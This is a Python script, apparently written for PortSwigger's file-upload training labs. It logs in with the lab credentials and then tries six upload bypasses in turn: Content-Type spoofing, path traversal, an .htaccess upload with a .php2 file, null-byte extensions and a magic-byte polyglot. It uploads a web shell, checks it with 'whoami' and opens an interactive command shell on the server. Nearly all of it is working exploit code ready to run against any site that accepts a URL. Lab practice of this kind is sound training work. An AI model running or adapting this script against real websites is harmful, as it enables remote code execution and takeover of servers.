"""
This script automatically exploits six of the labs of portswigger:
1. Remote code execution via web shell upload
2. Web shell upload via Content-Type restriction bypass
3. Web shell upload via path traversal
4. Web shell upload via extension blacklist bypass
5. Web shell upload via obfuscated file extension
6. Remote code execution via polyglot web shell upload

Side note: The files has to be manually kept in.
""" 
import requests
import re
import payload_injection
import os
import dotenv
from pathlib import Path
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
dotenv.load_dotenv()

class FileUpload: 
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.file_location = ""
        self.file_name = ""
        self.session = requests.Session()

    def csrf_token_extract(self, url):
        try:
            url_get = self.session.get(url).text
            csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
            if not csrf:
                raise print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
            return csrf
        except requests.exceptions.RequestException as e:
            print(f"RequestError: {e}")
            return None
        except ValueError as e: 
            print(f"Unexpected error: {e}")
            return None
        
    def file_upload(self, csrf, content_type=None, path_traversal=False, obsfucated_extension=False, magic_byte=False):
        if magic_byte:
            self.file_location = os.getenv('MAGIC_BYTE_FILE')
        else:
            self.file_location = os.getenv('FILE_TO_UPLOAD')
        if not self.file_location:
            print(f"The file to be uploaded is not set in the environment. Be sure to set the environment correctly. ദ്ദി ˉ͈̀꒳ˉ͈́ )✧")
            return None
        if not os.path.exists(self.file_location):
            print(f"The file doesn't exist. Common you can do better, I trust in you. ᕙ(  •̀ ᗜ •́  )ᕗ")
            return None
        self.file_name = Path(self.file_location).name

        if path_traversal:
            file = "..%2f" + self.file_name
        elif obsfucated_extension:
            file = self.file_name + "%00.png"
        else:
            file = self.file_name

        data={
            'csrf': csrf,
            'user':'wiener'
        }
        try:
            with open(self.file_location, "rb") as f: 
                files = {
                    "avatar": (file, f, content_type)
                }

                file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=files, verify=False)
            if file_upload_post.status_code != 200:
                print(f"{file_upload_post.status_code}: Payload containing file was not uploaded.")
                return False

            return True
        except requests.exceptions.RequestException as e:
            print(f"RequestError: {e}")
            return None
        except FileNotFoundError as e:
            print(f"File was not found. Check if file is readable ;-)")
            return None
    
    def exploit(self, condition, path_traversal=False):
        if not condition:
            return False
        if path_traversal:
            exploit_url = f"{self.url}/files/{self.file_name}"
        else:
            exploit_url = f"{self.url}/files/avatars/{self.file_name}"
        if payload_injection.start_payload(exploit_url, "whoami")  is None: #testing if exploit works
            print("Web shell verification failed")
            return False
        
        print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
        while True:
            try:
                payload = input("shell> ").strip()
                if not payload:
                    continue 
                if payload.lower() in ["stop", "exit", "quit"]:
                    print("Exiting shell.....")
                    break

                file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
                print(file_upload_web_shell)
                        
            except KeyboardInterrupt:
                print("\n\nKeyBoard Interuption. Exiting shell...")
                break
            except EOFError:
                print("\nExiting shell...")
                break
            except Exception as e:
                print(f"Error: {e}")
                return False
        return True
      

    def simple_file_upload(self):
        print("Trying simple file upload")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf)
        return self.exploit(file_upload_post)

    def content_type_file_upload(self):
        print("Trying content type vulnerability")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, "image/png")
        return self.exploit(file_upload_post)

    def path_traversal(self):
        print("Trying local file inclusion")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, path_traversal=True)
        return self.exploit(file_upload_post, path_traversal=True)
    
    def blacklist_bypass(self):
        print("Trying to bypass blacklist")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        data={
            'csrf': csrf,
            'user':'wiener'
        }
        try:
            with open(os.getenv("HTACCESS_FILE", "rb")) as f:
                htaccess = {
                    "avatar": (".htaccess", f)
                    }
                htaccess_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=htaccess, verify=False)
            with open(os.getenv("FILE_TO_UPLOAD"), "rb") as f:
                file = {
                    "avatar": ("web_shell.php2", f)
                }
                file_upload_post = self.session.post(url=f"{self.url}/my-account/avatar", data=data, files=file, verify=False)
            if htaccess_upload_post.status_code != 200 or file_upload_post.status_code != 200:
                print(f"{file_upload_post.status_code}: Payload containing file was not upload.")

        except requests.exceptions.RequestException as e:
            print(f"RequestError: {e}")
            return None
        except FileNotFoundError as e:
            print(f"File was not found. Check if file is readable ;-)") 
        
        exploit_url = f"{url}/files/avatars/web_shell.php2"
        if payload_injection.start_payload(exploit_url, "whoami")  is None:
                return False
        print("Exploitation was successfull, The web shell has spawned.\nSide note: To stop just type stop.")
        while True:
            try:
                payload = input("shell> ").strip() 
                if payload.lower() in ["stop", "exit", "quit"]:
                    break
                file_upload_web_shell =  payload_injection.start_payload(exploit_url, payload)
                print(file_upload_web_shell)
            except KeyboardInterrupt:
                print("\n\nKeyBoard Interuption. Exiting shell...")
                break
            except EOFError:
                print("\nExiting shell...")
                break
            except Exception as e:
                print(f"Error: {e}")
        return True
    
    def null_byte_injection(self):
        print("Trying null byte injection")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, obsfucated_extension=True)
        return self.exploit(file_upload_post)
    
    def magic_byte_file_upload(self):
        print("Trying magic bytes")
        csrf = self.csrf_token_extract(f"{self.url}/my-account")
        file_upload_post = self.file_upload(csrf, magic_byte=True)
        return self.exploit(file_upload_post)
        
        
    def login(self):
        csrf_token = self.csrf_token_extract(f"{self.url}/login")
        if csrf_token is None:
            print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
        login_info = {
            "username": "wiener", #credentials given in website
            "password": "peter", #credentials given in website
            "csrf": csrf_token 
        }
        try:
            self.login_page_post = self.session.post(url=f"{self.url}/login", verify=False, data=login_info, allow_redirects=True)

        except requests.exceptions.Timeout:
            print("Error: Request timed out")
            return False
        
        except requests.exceptions.RequestException as e:
            print(f"Error: Network request failed - {e}")
        
        exploit_methods = [
        ("Simple file upload", self.simple_file_upload),
        ("Content-Type bypass", self.content_type_file_upload),
        ("Path traversal", self.path_traversal),
        ("Blacklist bypass", self.blacklist_bypass),
        ("Null byte injection", self.null_byte_injection),
        ("Magic byte upload", self.magic_byte_file_upload)
        ]

        for method_name, method in exploit_methods:
            try:
                if method():
                    print(f"Success with {method_name}")
                    print("Bye bye ˙◠˙")
                    return True
            except Exception as e:
                print(f"{method_name} failed: {e}")
                continue
        print("All exploits failed. Sorry you will have to search for better programmer than me. (╥﹏╥)")
        return False

url = input("Enter the link to exploit: ")
start = FileUpload(url)
start.login()